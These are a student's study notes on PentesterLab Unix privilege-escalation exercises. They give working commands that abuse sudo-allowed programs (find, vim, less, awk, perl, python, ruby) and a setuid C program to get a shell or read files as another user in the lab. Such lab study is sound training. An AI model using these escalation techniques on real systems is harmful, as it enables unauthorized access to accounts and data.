pentesterlab

 - first try the exercise
 - watch all videos
 - condense the notes
 - stay in the lab for some time
 - look for the same vulns. in real programs
 - do webacademy and pentesterlab side by side
___________________________________________________________________

unix (privelege escalation)
___________________________________________________________________

#25

sudo command is used to run commands as another user. most of the 
time, it's used to give unpriviliged users the right to run 
command as root

$ sudo -l
$ sudo -u victim /bin/bash
$ id
___________________________________________________________________

#26

you can see that you're allowed to run the command /usr/bin/find, 
based on previous exercise on find and the argument -exec, you 
should be able to escalate your privileges and start a shell 
(/bin/bash) as the victim user. once you do, you should see the 
key in the home directory of the victim user.

otherwise, you can also use -exec to run the command cat on the 
key.txt file directly.

sudo -u victim /usr/bin/find -exec cat {} \;
sudo -u victim /usr/bin/find -exec bash \;
___________________________________________________________________

#27

reading the file can be done directly by specifying the file's 
path on the command line after the command or by opening the file 
inside vim (using :r [path]).

to gain a shell as the user victim, you can start vim then you 
can type the following: :!/bin/bash to run /bin/bash. since vim 
run as the victim user (thanks to sudo), the new shell will also 
run as the user victim. once you do get the shell, you should see 
the key in the home directory of the victim user.
___________________________________________________________________

#28

reading the file can be done directly by specifying the full path 
of the file on the command line after the command or by opening 
the file inside less (using :e [path]).

to gain a shell as the user victim, you can start less then you 
can type the following: !/bin/bash to run /bin/bash. since less 
run as the victim user (thanks to sudo), the new shell will also 
run as the user victim. once you do get the shell, you should see 
the key in the home directory of the victim user.
___________________________________________________________________

#29

sudo -u victim /usr/bin/
awk '{print $1}' /home/victim/key.txt
awk 'begin {system("/bin/bash")}'
___________________________________________________________________

#30

here we are going to solve this challenge by creating a setgid 
program. this program will run as the victim group once you run 
it thanks to the setgid bit.

you can see that a program is setuid or setgid by looking at its 
permissions:

ls -l /usr/bin/passwd

-rwsr-xr-x 1 root root 54192 nov 18 2015 /usr/bin/passwd

in this example, the program /usr/bin/passwd is setuid root as it 
will run as the user root even if it's started by another user. 
you can see the setuid bit in the output of ls -l with the s in 
the permissions (instead of x for non-setuid program). setuid 
root are always a good target as they often allow privileges 
escalation.

a few years ago, you could exploit this configuration issue by 
copying a shell (bash a long time ago and ksh more recently) and 
adding the setuid bit to it. [un]fortunately most shells will now 
prevent this attack. but we can still do something similar by 
writing our own program.

to create this program, you can use the following c code:

int main(void)
{
system("cat /home/victim/key.txt");
}

you can then compile it:


gcc -o /tmp/[file] [file].c

where [file] is the filename.

then you will need to copy it using the sudo, this will allow you 
to create a file owned by the victim user. once you copied it, 
you should be able to set the setuid and setgid flags on it using:

chmod +xs [file]

where [file] is the filename.

now you can run this program as the pentesterlab and you should 
be able to get access to the key.txt file thanks to the setgid bit.
___________________________________________________________________

#31

to solve this challenge, you will need to use perl -e '...' 
followed by valid perl code. you can just use print and backticks 
to run a command and get its result. you will need to use this to 
get the content of the file 
/home/victim/key.txt. otherwise, you can also spawn a shell 
running as victim by using perl -e '...' and backticks.
___________________________________________________________________

#32

sudo -u victim /usr/bin/perl -e 'print `cat /home/victim/key.txt`'
___________________________________________________________________

#33

to solve this challenge, you will need to use the python command 
that will start a repl (a read–eval–print loop). from that you 
should be able to:

    import the call command from the subprocess module:
    from subprocess import call
    run commands:
    call(['uname'])

you can also manage to get the same result using the os module 
and os.system('uname')
os.system('cat ~/key.txt')
___________________________________________________________________

#34

sudo -u victim /usr/bin/ruby -e 'require "irb" ; 
irb.start(__file__)'
___________________________________________________________________